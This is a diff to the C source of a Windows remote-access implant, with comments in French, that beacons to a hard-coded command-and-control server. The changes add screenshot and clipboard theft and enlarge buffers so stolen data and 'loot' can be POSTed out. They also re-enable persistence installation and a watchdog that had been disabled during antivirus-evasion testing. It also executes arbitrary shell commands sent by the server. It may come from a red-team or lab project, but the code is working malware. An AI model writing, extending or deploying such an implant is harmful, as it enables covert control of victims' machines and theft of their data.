@@ -9,11 +9,16 @@
 #include "rdp.h"
 #include "keylog.h"
 #include "loot.h"
+#include "screenshot.h"
+#include "clipboard.h"
 
 // Configuration
-#define C2_SERVER "10.18.207.184"//"c2.s0p0wned.local"
+#define C2_SERVER "192.168.1.119"//"10.18.207.184"//"c2.s0p0wned.local"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
+
+// Taille max du buffer résultat — doit être >= 2 MB pour screenshot/loot grab
+#define MAX_RESULT_SIZE (2 * 1024 * 1024)
 
 // Variable globale pour arrêt propre de l'agent
 volatile BOOL g_should_exit = FALSE;
@@ -353,6 +358,19 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
         return;
     }
 
+    // Commande Screenshot
+    if (strncmp(cmd, "screenshot", 10) == 0) {
+        printf("[*] Taking screenshot...\n");
+        screenshot_grab(output, output_size);
+        return;
+    }
+
+    // Commande Clipboard
+    if (strncmp(cmd, "clipboard", 9) == 0) {
+        clipboard_get(output, output_size);
+        return;
+    }
+
     // Commande shell normale
     SECURITY_ATTRIBUTES sa;
     HANDLE hRead, hWrite;
@@ -361,7 +379,7 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
     DWORD bytes_read;
     char buffer[4096];
     
-    printf("[*] Exécution : %s\n", cmd);
+    printf("[*] Executing: %s\n", cmd);
     
     output[0] = '\0';
     
@@ -434,36 +452,42 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
 int send_result(const SystemInfo *sys_info, const char *command, const char *output) {
     HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
     int success = 0;
-    
+
     printf("[*] Envoi du résultat au serveur...\n");
-    
+
     // Créer le timestamp
     time_t now = time(NULL);
     struct tm *t = localtime(&now);
     char timestamp[64];
     strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%S", t);
-    
-    // Construire le JSON
-    char json_data[8192];
+
+    // Buffer JSON : MAX_RESULT_SIZE + overhead pour l'enveloppe JSON
+    // (le contenu base64 ne nécessite pas d'échappement JSON, donc peu d'overhead)
+    size_t json_buf_size = MAX_RESULT_SIZE + 4096;
+    char *json_data = (char *)malloc(json_buf_size);
+    if (!json_data) {
+        printf("[-] send_result: malloc failed\n");
+        return 0;
+    }
     int json_pos = 0;
     
     // Début du JSON
-    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
+    json_pos += snprintf(json_data + json_pos, (int)json_buf_size - json_pos,
                         "{\"agent_id\":\"%s\",\"command\":\"", sys_info->agent_id);
-    
+
     // Échapper la commande
-    for (const char *p = command; *p && json_pos < sizeof(json_data) - 10; p++) {
+    for (const char *p = command; *p && json_pos < (int)json_buf_size - 10; p++) {
         if (*p == '"' || *p == '\\') {
             json_data[json_pos++] = '\\';
         }
         json_data[json_pos++] = *p;
     }
-    
-    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
+
+    json_pos += snprintf(json_data + json_pos, (int)json_buf_size - json_pos,
                         "\",\"output\":\"");
-    
+
     // Échapper l'output
-    for (const char *p = output; *p && json_pos < sizeof(json_data) - 10; p++) {
+    for (const char *p = output; *p && json_pos < (int)json_buf_size - 10; p++) {
         if (*p == '"' || *p == '\\') {
             json_data[json_pos++] = '\\';
             json_data[json_pos++] = *p;
@@ -480,24 +504,24 @@ int send_result(const SystemInfo *sys_info, const char *command, const char *out
             json_data[json_pos++] = *p;
         }
     }
-    
-    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
+
+    json_pos += snprintf(json_data + json_pos, (int)json_buf_size - json_pos,
                         "\",\"timestamp\":\"%s\"}", timestamp);
-    
+
     json_data[json_pos] = '\0';
-    
+
     // Connexion au serveur
     hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) goto cleanup;
-    
+
     hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT, NULL, NULL,
                                 INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) goto cleanup;
-    
+
     hRequest = HttpOpenRequestA(hConnect, "POST", "/result", NULL, NULL, NULL,
                                 INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!hRequest) goto cleanup;
-    
+
     // Envoyer
     char headers[] = "Content-Type: application/json\r\n";
     if (HttpSendRequestA(hRequest, headers, strlen(headers),
@@ -507,12 +531,13 @@ int send_result(const SystemInfo *sys_info, const char *command, const char *out
     } else {
         printf("[-] Échec de l'envoi du résultat\n");
     }
-    
+
 cleanup:
     if (hRequest) InternetCloseHandle(hRequest);
     if (hConnect) InternetCloseHandle(hConnect);
     if (hInternet) InternetCloseHandle(hInternet);
-    
+    free(json_data);
+
     return success;
 }
 
@@ -593,16 +618,23 @@ int do_beacon_cycle(SystemInfo *sys_info) {
     char command[256];
     if (extract_command(response, command)) {
         printf("[+] Command: %s\n", command);
-        
-        // Exécuter
-        char result[4096];
-        execute_command(command, result, sizeof(result));
-        
-        // Afficher localement (optionnel)
+
+        // Buffer dynamique : MAX_RESULT_SIZE pour supporter screenshot / loot grab
+        char *result = (char *)malloc(MAX_RESULT_SIZE);
+        if (!result) {
+            printf("[-] malloc result failed\n");
+            goto cleanup;
+        }
+        result[0] = '\0';
+
+        execute_command(command, result, MAX_RESULT_SIZE);
+
+        // Afficher localement (aperçu limité)
         printf("[+] Output: %.100s%s\n", result, strlen(result) > 100 ? "..." : "");
-        
+
         // Envoyer le résultat
         send_result(sys_info, command, result);
+        free(result);
     } else {
         printf("[-] No commands\n");
     }
@@ -648,20 +680,18 @@ int main() {
     collect_system_info(&sys_info);
     
     // Installer la persistence au premier lancement si pas déjà installé
-    // DÉSACTIVÉ TEMPORAIREMENT pour tests anti-Defender
-    // if (!is_already_installed()) {
-    //     printf("\n[*] First run detected\n");
-    //     install_all_persistence();
-    // }
-    printf("[*] Persistence disabled for AV testing\n");
-    
-    // Démarrer le watchdog
-    // DÉSACTIVÉ TEMPORAIREMENT : le watchdog nécessite d'être un processus séparé, pas un thread
-    // watchdog = start_watchdog();
-    // if (watchdog == NULL) {
-    //     printf("[-] Warning: Watchdog failed to start\n");
-    // }
-    printf("[*] Watchdog disabled (will be reimplemented as separate process)\n");
+    if (!is_already_installed()) {
+        printf("\n[*] First run detected — installing persistence...\n");
+        install_all_persistence();
+    } else {
+        printf("[*] Already installed, skipping persistence setup\n");
+    }
+
+    // Démarrer le watchdog (thread de surveillance)
+    watchdog = start_watchdog();
+    if (watchdog == NULL) {
+        printf("[-] Warning: Watchdog failed to start\n");
+    }
     
     printf("\n[*] Starting beacon loop...\n");
     printf("======================================\n\n");
@@ -687,11 +717,10 @@ int main() {
     }
     
     // Nettoyage
-    // Watchdog désactivé temporairement
-    // if (watchdog != NULL) {
-    //     stop_watchdog(watchdog);
-    // }
-    
+    if (watchdog != NULL) {
+        stop_watchdog(watchdog);
+    }
+
     if (singleton_mutex != NULL) {
         CloseHandle(singleton_mutex);
     }
